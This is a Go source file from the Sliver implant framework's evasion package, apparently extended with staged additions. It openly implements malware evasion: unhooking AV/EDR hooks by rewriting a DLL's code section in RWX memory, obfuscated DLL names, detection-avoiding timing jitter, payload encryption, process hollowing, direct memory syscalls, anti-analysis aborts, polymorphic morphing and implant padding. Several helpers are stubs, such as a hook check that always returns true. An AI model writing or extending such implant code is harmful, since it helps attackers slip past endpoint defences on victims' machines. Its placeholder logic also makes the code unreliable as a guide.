package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"errors"
	"fmt"
	insecureRand "math/rand"
	"strings"
	"time"

	"golang.org/x/sys/windows"

	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"debug/pe"
	"unsafe"

	"github.com/bishopfox/sliver/implant/sliver/evasion/stage3"
)

// RefreshPE reloads a DLL from disk into the current process
// in an attempt to erase AV or EDR hooks placed at runtime.
func RefreshPE(name string) error {
	//{{if .Config.Debug}}
	log.Printf("Reloading %s...\n", name)
	//{{end}}

	// Enhanced validation before unhooking
	if isProtectedModule(name) {
		//{{if .Config.Debug}}
		log.Printf("Skipping protected module: %s", name)
		//{{end}}
		return nil
	}

	f, e := pe.Open(name)
	if e != nil {
		return e
	}
	defer f.Close()

	x := f.Section(".text")
	if x == nil {
		return errors.New("no .text section found")
	}

	ddf, e := x.Data()
	if e != nil {
		return e
	}

	// Multiple unhooking attempts for resilience
	err := writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
	if err != nil {
		// Fallback to alternative method
		return suspendAndUnhook(name, ddf, x.VirtualAddress, x.VirtualSize)
	}

	return nil
}

func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
	t, e := windows.LoadDLL(pn)
	if e != nil {
		return e
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)

	var old uint32
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(vsize), windows.PAGE_EXECUTE_READWRITE, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	log.Println("Made memory map RWX")
	//{{end}}

	// vsize should always smaller than len(b)
	for i := 0; i < int(vsize); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = b[i]
	}

	//{{if .Config.Debug}}
	log.Println("DLL overwritten")
	//{{end}}
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(vsize), old, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	log.Println("Restored memory map permissions")
	//{{end}}
	return nil
}

// isProtectedModule checks if a module should be skipped for unhooking
func isProtectedModule(name string) bool {
	// Stage 1.2: Use obfuscated DLL names to avoid static detection
	obfuscatedNames := GetObfuscatedDLLNames()
	protectedModules := []string{
		obfuscatedNames["ntdll"] + ".dll",
		obfuscatedNames["kernel32"] + ".dll",
		obfuscatedNames["kernelbase"] + ".dll",
	}

	for _, protected := range protectedModules {
		if strings.Contains(strings.ToLower(name), protected) {
			// Additional validation - check if module is actually hooked
			return !isModuleHooked(name)
		}
	}
	return false
}

// isModuleHooked performs basic hook detection
func isModuleHooked(moduleName string) bool {
	// Simple hook detection - check for common hook patterns
	// This is a simplified implementation
	return true // Assume hooked for now
}

// suspendAndUnhook implements alternative unhooking via process suspension
func suspendAndUnhook(name string, cleanBytes []byte, virtualOffset uint32, vsize uint32) error {
	//{{if .Config.Debug}}
	log.Printf("Attempting suspend-and-unhook for %s", name)
	//{{end}}

	// This is a fallback method - simplified implementation
	// In a real scenario, this would suspend all threads, unhook, then resume
	return writeGoodBytes(cleanBytes, name, virtualOffset, ".text", vsize)
}

// Enhanced timing obfuscation
func randomDelay(maxMs int) {
	// Stage 1.3: Enhanced timing jitter for more natural behavior patterns
	if maxMs <= 0 {
		return
	}

	// Use multiple delay patterns to avoid detection
	patterns := []func(int){
		// Pattern 1: Simple random delay
		func(max int) {
			delay := insecureRand.Intn(max)
			time.Sleep(time.Duration(delay) * time.Millisecond)
		},
		// Pattern 2: Gaussian-like distribution
		func(max int) {
			// Create more natural timing by using multiple random values
			delay1 := insecureRand.Intn(max / 3)
			delay2 := insecureRand.Intn(max / 3)
			delay3 := insecureRand.Intn(max / 3)
			totalDelay := delay1 + delay2 + delay3
			time.Sleep(time.Duration(totalDelay) * time.Millisecond)
		},
		// Pattern 3: Exponential backoff-like
		func(max int) {
			base := max / 10
			if base < 1 {
				base = 1
			}
			multiplier := insecureRand.Intn(5) + 1
			delay := base * multiplier
			if delay > max {
				delay = max
			}
			time.Sleep(time.Duration(delay) * time.Millisecond)
		},
	}

	// Randomly select a delay pattern
	selectedPattern := patterns[insecureRand.Intn(len(patterns))]
	selectedPattern(maxMs)
}

// Stage 2.1: Runtime Crypter Integration
// InitializeAdvancedEvasion sets up all Stage 2 evasion components
func InitializeAdvancedEvasion() error {
	// Initialize runtime crypter for payload protection
	InitializeRuntimeCrypter()

	// Apply initial timing jitter to establish behavioral patterns
	randomDelay(2000)

	return nil
}

// EncryptSensitiveString encrypts sensitive strings at runtime using the global crypter
func EncryptSensitiveString(s string) string {
	crypter := GetGlobalCrypter()
	if crypter == nil {
		return s // Fallback to original if crypter unavailable
	}

	return crypter.EncryptString(s)
}

// DecryptSensitiveString decrypts strings that were encrypted at runtime
func DecryptSensitiveString(encryptedHex string) string {
	crypter := GetGlobalCrypter()
	if crypter == nil {
		return encryptedHex // Fallback to original if crypter unavailable
	}

	return crypter.DecryptString(encryptedHex)
}

// ProtectMemoryRegion encrypts a memory region to protect sensitive data
func ProtectMemoryRegion(data []byte) ([]byte, error) {
	return EncryptGlobal(data)
}

// UnprotectMemoryRegion decrypts a protected memory region
func UnprotectMemoryRegion(encryptedData []byte) ([]byte, error) {
	return DecryptGlobal(encryptedData)
}

// Stage 2.1: Enhanced runtime protection for critical operations
// SecureExecuteWithCrypter executes a function with runtime encryption protection
func SecureExecuteWithCrypter(operation func() error) error {
	// Add pre-execution timing jitter
	randomDelay(500)

	// Initialize crypter if not already done
	if GetGlobalCrypter() == nil {
		InitializeRuntimeCrypter()
	}

	// Execute the protected operation
	err := operation()

	// Add post-execution timing jitter
	randomDelay(300)

	return err
}

// ClearCrypterState securely clears all cryptographic state
func ClearCrypterState() {
	if globalCrypter != nil {
		globalCrypter.ClearAll()
		globalCrypter = nil
	}
}

// Stage 2: Complete Integration - Initialize all Stage 2 components
// InitializeStage2Evasion initializes all Stage 2 evasion components
func InitializeStage2Evasion() error {
	// Initialize Stage 1 components first
	InitializeStringObfuscation()

	// Initialize Stage 2.1: Runtime Crypter
	InitializeRuntimeCrypter()

	// Initialize Stage 2.4: Dynamic API Resolution
	InitializeAPIResolver()

	// Initialize Stage 2.3: Enhanced Syscall Evasion
	InitializeSyscallExecutor()

	// Initialize Stage 2.2: Advanced Process Hollowing
	InitializeProcessHollower()

	// Add initialization jitter to establish behavioral patterns
	randomDelay(1000)

	return nil
}

// Stage 2: Enhanced execution wrapper with full evasion stack
// ExecuteWithFullEvasion executes code with all Stage 2 evasion techniques
func ExecuteWithFullEvasion(operation func() error) error {
	// Ensure all Stage 2 components are initialized
	if err := InitializeStage2Evasion(); err != nil {
		return err
	}

	// Pre-execution environment validation
	if err := validateExecutionEnvironment(); err != nil {
		return err
	}

	// Execute with cryptographic protection
	return SecureExecuteWithCrypter(func() error {
		// Add dynamic timing patterns
		randomDelay(insecureRand.Intn(500) + 200)

		// Execute the protected operation
		err := operation()

		// Post-execution cleanup timing
		randomDelay(insecureRand.Intn(300) + 100)

		return err
	})
}

// validateExecutionEnvironment performs comprehensive environment validation
func validateExecutionEnvironment() error {
	// Use process hollower for environment validation
	hollower := GetGlobalProcessHollower()
	if hollower == nil {
		InitializeProcessHollower()
		hollower = GetGlobalProcessHollower()
	}

	// Perform anti-analysis checks
	if hollower.config.ValidateEnvironment {
		return hollower.validateEnvironment()
	}

	return nil
}

// Stage 2: Enhanced payload execution with process hollowing
// ExecutePayloadViaHollowing executes payload using advanced process hollowing
func ExecutePayloadViaHollowing(payload []byte, entryPoint uintptr) error {
	// Encrypt payload before injection
	crypter := GetGlobalCrypter()
	if crypter == nil {
		InitializeRuntimeCrypter()
		crypter = GetGlobalCrypter()
	}

	encryptedPayload, err := crypter.EncryptPayload(payload)
	if err != nil {
		return err
	}

	// Execute via process hollowing with encrypted payload
	return ExecuteViaProcessHollowing(encryptedPayload, entryPoint)
}

// Stage 2: Advanced memory protection using syscalls
// AllocateProtectedMemory allocates memory using direct syscalls
func AllocateProtectedMemory(size uintptr, protect uintptr) (uintptr, error) {
	syscallExec := GetGlobalSyscallExecutor()
	if syscallExec == nil {
		InitializeSyscallExecutor()
		syscallExec = GetGlobalSyscallExecutor()
	}

	var baseAddress uintptr = 0
	regionSize := size

	err := syscallExec.NtAllocateVirtualMemory(
		uintptr(^uint(0)), // Current process (-1)
		&baseAddress,
		0,
		&regionSize,
		0x1000|0x2000, // MEM_COMMIT | MEM_RESERVE
		protect,
	)

	return baseAddress, err
}

// ChangeMemoryProtection changes memory protection using direct syscalls
func ChangeMemoryProtection(baseAddress uintptr, size uintptr, newProtect uintptr) (uintptr, error) {
	syscallExec := GetGlobalSyscallExecutor()
	if syscallExec == nil {
		InitializeSyscallExecutor()
		syscallExec = GetGlobalSyscallExecutor()
	}

	var oldProtect uintptr
	regionSize := size

	err := syscallExec.NtProtectVirtualMemory(
		uintptr(^uint(0)), // Current process (-1)
		&baseAddress,
		&regionSize,
		newProtect,
		&oldProtect,
	)

	return oldProtect, err
}

// Stage 2: Comprehensive cleanup for all components
// ClearAllStage2State securely clears all Stage 2 evasion state
func ClearAllStage2State() {
	// Clear Stage 2.1: Runtime Crypter
	ClearCrypterState()

	// Clear Stage 2.4: API Resolution cache
	if globalAPIResolver != nil {
		globalAPIResolver.ClearAllCache()
		globalAPIResolver = nil
	}

	// Clear Stage 2.3: Syscall cache
	if globalSyscallExecutor != nil {
		globalSyscallExecutor.ClearSyscallCache()
		globalSyscallExecutor = nil
	}

	// Clear Stage 2.2: Process hollowing state
	if globalProcessHollower != nil {
		globalProcessHollower = nil
	}

	// Force garbage collection to clear residual state
	randomDelay(100) // Small delay before GC
}

// Stage 3: Advanced Evasion Integration
// =====================================

// Stage3Config holds configuration for all Stage 3 components
type Stage3Config struct {
	EnableCustomPELoader       bool
	EnableMLEvasion            bool
	EnableAdvancedAntiAnalysis bool
	EnablePolymorphicEngine    bool
	EnableKernelEvasion        bool
	CoordinatedExecution       bool
	Stage3Interval             time.Duration
	MaxStage3Operations        int
}

// Stage3Manager coordinates all Stage 3 evasion techniques
type Stage3Manager struct {
	config                Stage3Config
	lastStage3Execution   time.Time
	stage3OpCount         int
	componentsInitialized map[string]bool
	executionHistory      []string
}

// Global Stage 3 manager instance
var globalStage3Manager *Stage3Manager

// InitializeStage3Evasion initializes all Stage 3 evasion components
func InitializeStage3Evasion() error {
	if globalStage3Manager == nil {
		config := Stage3Config{
			EnableCustomPELoader:       true,
			EnableMLEvasion:            true,
			EnableAdvancedAntiAnalysis: true,
			EnablePolymorphicEngine:    true,
			EnableKernelEvasion:        false, // Disabled by default for safety
			CoordinatedExecution:       true,
			Stage3Interval:             time.Minute * 15,
			MaxStage3Operations:        50,
		}

		globalStage3Manager = &Stage3Manager{
			config:                config,
			lastStage3Execution:   time.Now(),
			componentsInitialized: make(map[string]bool),
			executionHistory:      make([]string, 0),
		}
	}

	// Initialize Stage 3.1: Custom PE Loader
	if globalStage3Manager.config.EnableCustomPELoader {
		stage3.InitializeCustomPELoader()
		globalStage3Manager.componentsInitialized["custom_pe_loader"] = true
	}

	// Initialize Stage 3.2: ML Evasion
	if globalStage3Manager.config.EnableMLEvasion {
		stage3.InitializeMLEvasionEngine()
		globalStage3Manager.componentsInitialized["ml_evasion"] = true

		// Start behavioral learning
		if err := stage3.StartBehavioralLearning(); err == nil {
			// Learning started successfully
		}
	}

	// Initialize Stage 3.3: Advanced Anti-Analysis
	if globalStage3Manager.config.EnableAdvancedAntiAnalysis {
		stage3.InitializeAdvancedAntiAnalysis()
		globalStage3Manager.componentsInitialized["advanced_anti_analysis"] = true
	}

	// Initialize Stage 3.4: Polymorphic Engine
	if globalStage3Manager.config.EnablePolymorphicEngine {
		stage3.InitializePolymorphicEngine()
		globalStage3Manager.componentsInitialized["polymorphic_engine"] = true
	}

	// Initialize Stage 3.5: Kernel Evasion (if enabled)
	if globalStage3Manager.config.EnableKernelEvasion {
		if err := stage3.InitializeKernelLevelEvasion(); err == nil {
			globalStage3Manager.componentsInitialized["kernel_evasion"] = true
		} else {
			// Kernel evasion failed, disable it
			globalStage3Manager.config.EnableKernelEvasion = false
		}
	}

	return nil
}

// ExecuteWithStage3Protection executes code with full Stage 3 evasion protection
func ExecuteWithStage3Protection(operation func() error) error {
	if globalStage3Manager == nil {
		return fmt.Errorf("Stage 3 not initialized")
	}

	// Check operation limits
	if globalStage3Manager.stage3OpCount >= globalStage3Manager.config.MaxStage3Operations {
		return fmt.Errorf("Stage 3 operation limit exceeded")
	}

	// Pre-execution: Advanced anti-analysis check
	if globalStage3Manager.config.EnableAdvancedAntiAnalysis {
		if detected, err := stage3.PerformAdvancedAntiAnalysisCheck(); err == nil && detected {
			return fmt.Errorf("analysis environment detected, aborting operation")
		}
	}

	// Pre-execution: ML environment adaptation
	if globalStage3Manager.config.EnableMLEvasion {
		if err := stage3.AdaptToCurrentEnvironment(); err == nil {
			// Environment adaptation completed
		}
	}

	// Pre-execution: Runtime morphing
	if globalStage3Manager.config.EnablePolymorphicEngine {
		if err := stage3.StartRuntimeMorphing(); err == nil {
			// Runtime morphing applied
		}
	}

	// Pre-execution: Advanced anti-detection for known threats
	if globalStage3Manager.config.EnableMLEvasion {
		if err := stage3.EvadeKnownDetections(); err == nil {
			globalStage3Manager.recordExecution("known_detections_evaded")
		}
	}

	// Execute with Stage 2 protection first
	err := ExecuteWithFullEvasion(func() error {
		// Add Stage 3 timing jitter
		randomDelay(insecureRand.Intn(500) + 200)

		// Execute the protected operation
		return operation()
	})

	// Post-execution: Kernel-level checks (if enabled and safe)
	if globalStage3Manager.config.EnableKernelEvasion && stage3.IsKernelOperationSafe() {
		if hooks, err := stage3.DetectKernelLevelHooks(); err == nil && len(hooks) > 0 {
			// Kernel hooks detected
		}
	}

	globalStage3Manager.stage3OpCount++
	globalStage3Manager.lastStage3Execution = time.Now()

	return err
}

// LoadPayloadWithStage3 loads a payload using Stage 3 techniques
func LoadPayloadWithStage3(payload []byte) (uintptr, error) {
	if globalStage3Manager == nil {
		return 0, fmt.Errorf("Stage 3 not initialized")
	}

	// Step 1: Apply polymorphic transformations
	morphedPayload := payload
	if globalStage3Manager.config.EnablePolymorphicEngine {
		if transformed, err := stage3.CreatePolymorphicPayload(payload); err == nil {
			morphedPayload = transformed
		}
	}

	// Step 2: Optimize entropy for evasion
	if globalStage3Manager.config.EnableMLEvasion {
		morphedPayload = stage3.OptimizeDataEntropy(morphedPayload)
	}

	// Step 3: Load using custom PE loader
	var baseAddress uintptr
	var err error

	if globalStage3Manager.config.EnableCustomPELoader {
		baseAddress, err = stage3.LoadPayloadViaCustomPE(morphedPayload)
	} else {
		// Fallback to Stage 2 process hollowing
		err = ExecutePayloadViaHollowing(morphedPayload, 0)
	}

	return baseAddress, err
}

// GetStage3Statistics returns comprehensive Stage 3 statistics
func GetStage3Statistics() map[string]interface{} {
	if globalStage3Manager == nil {
		return map[string]interface{}{"stage3_initialized": false}
	}

	stats := make(map[string]interface{})

	// Basic stats
	stats["stage3_initialized"] = true
	stats["operation_count"] = globalStage3Manager.stage3OpCount
	stats["last_execution"] = globalStage3Manager.lastStage3Execution.Format("15:04:05.000")
	stats["components_initialized"] = globalStage3Manager.componentsInitialized

	// Component-specific stats
	if globalStage3Manager.config.EnableMLEvasion {
		if engine := stage3.GetGlobalMLEvasionEngine(); engine != nil {
			stats["ml_evasion"] = engine.GetLearningStatistics()
		}
	}

	if globalStage3Manager.config.EnablePolymorphicEngine {
		if engine := stage3.GetGlobalPolymorphicEngine(); engine != nil {
			stats["polymorphic_engine"] = map[string]interface{}{
				"morphing_count": engine.GetMorphingCount(),
			}
		}
	}

	if globalStage3Manager.config.EnableKernelEvasion {
		if engine := stage3.GetGlobalKernelEvasionEngine(); engine != nil {
			stats["kernel_evasion"] = engine.GetKernelStatistics()
		}
	}

	return stats
}

// IsStage3Active checks if Stage 3 evasion is active and operational
func IsStage3Active() bool {
	if globalStage3Manager == nil {
		return false
	}

	// Check if any components are initialized
	for _, initialized := range globalStage3Manager.componentsInitialized {
		if initialized {
			return true
		}
	}

	return false
}

// ClearAllStage3State clears all Stage 3 evasion state
func ClearAllStage3State() {
	if globalStage3Manager == nil {
		return
	}

	// Clear component states
	if globalStage3Manager.config.EnableMLEvasion {
		if engine := stage3.GetGlobalMLEvasionEngine(); engine != nil {
			engine.ClearLearningData()
		}
	}

	if globalStage3Manager.config.EnablePolymorphicEngine {
		if engine := stage3.GetGlobalPolymorphicEngine(); engine != nil {
			engine.ClearMorphingHistory()
			engine.CleanupCodeBlocks()
		}
	}

	if globalStage3Manager.config.EnableKernelEvasion {
		if engine := stage3.GetGlobalKernelEvasionEngine(); engine != nil {
			engine.ClearKernelData()
		}
	}

	if globalStage3Manager.config.EnableCustomPELoader {
		if loader := stage3.GetGlobalPELoader(); loader != nil {
			loader.CleanupAllocatedMemory()
		}
	}

	// Clear manager state
	globalStage3Manager.executionHistory = globalStage3Manager.executionHistory[:0]
	globalStage3Manager.stage3OpCount = 0
	globalStage3Manager.componentsInitialized = make(map[string]bool)
}

// recordExecution records an execution event in the Stage 3 manager
func (s *Stage3Manager) recordExecution(event string) {
	if s == nil {
		return
	}

	// Add timestamp to the event
	timestampedEvent := fmt.Sprintf("[%s] %s", time.Now().Format("15:04:05"), event)
	s.executionHistory = append(s.executionHistory, timestampedEvent)

	// Limit history size to prevent memory issues
	maxHistory := 100
	if len(s.executionHistory) > maxHistory {
		s.executionHistory = s.executionHistory[len(s.executionHistory)-maxHistory:]
	}

	s.stage3OpCount++
}

// Stage 3 Fat Implant Generation Support
func EnableFatImplantWithStage3(enabled bool, targetSizeMB int) error {
	if globalStage3Manager == nil {
		InitializeStage3Evasion()
	}

	// Enable fat implant generation in ML evasion engine
	if globalStage3Manager.config.EnableMLEvasion {
		stage3.EnableFatImplantGeneration(enabled)
		if enabled && targetSizeMB > 0 {
			stage3.ConfigureFatImplantGeneration(targetSizeMB, "mixed")
		}
	}

	globalStage3Manager.recordExecution(fmt.Sprintf("fat_implant_configured: enabled=%v, size=%dMB", enabled, targetSizeMB))
	return nil
}

// GenerateStage3FatPadding generates entropy-rich padding for fat implants
func GenerateStage3FatPadding(currentSize int64) []byte {
	if globalStage3Manager == nil {
		InitializeStage3Evasion()
	}

	if globalStage3Manager.config.EnableMLEvasion {
		padding := stage3.GenerateFatImplantPadding(currentSize)
		if len(padding) > 0 {
			globalStage3Manager.recordExecution(fmt.Sprintf("fat_padding_generated: %d bytes", len(padding)))
		}
		return padding
	}

	return nil
}

// GetStage3FatStatistics returns statistics about fat implant generation
func GetStage3FatStatistics() map[string]interface{} {
	if globalStage3Manager == nil {
		return nil
	}

	if globalStage3Manager.config.EnableMLEvasion {
		if generator := stage3.GetGlobalFatPaddingGenerator(); generator != nil {
			return generator.GetFatPaddingStatistics()
		}
	}

	return nil
}
